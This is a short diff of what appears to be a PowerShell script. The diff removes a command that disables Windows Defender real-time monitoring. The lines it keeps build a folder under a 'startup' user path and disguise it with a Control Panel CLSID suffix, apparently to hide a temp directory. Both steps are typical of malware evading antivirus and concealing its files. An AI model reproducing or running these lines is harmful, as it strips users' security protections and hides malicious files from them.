@@ -1,5 +1,3 @@
-Set-MpPreference -DisableRealtimeMonitoring $true
-
 $rdir = "C:\Users\startup"
 $dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
 $temp = "$dir\temp"
